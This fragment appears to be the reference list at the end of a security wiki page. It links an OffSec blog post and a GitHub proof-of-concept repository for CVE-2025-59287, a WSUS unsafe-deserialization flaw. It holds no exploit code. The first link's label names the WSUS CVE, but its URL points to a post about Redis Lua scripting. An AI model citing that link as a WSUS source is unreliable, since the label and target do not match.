- [OffSec – CVE-2025-59287 WSUS unsafe deserialization (blog)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine-2/)
- [PoC – tecxx/CVE-2025-59287-WSUS](https://github.com/tecxx/CVE-2025-59287-WSUS)

{{#include ../../banners/hacktricks-training.md}}
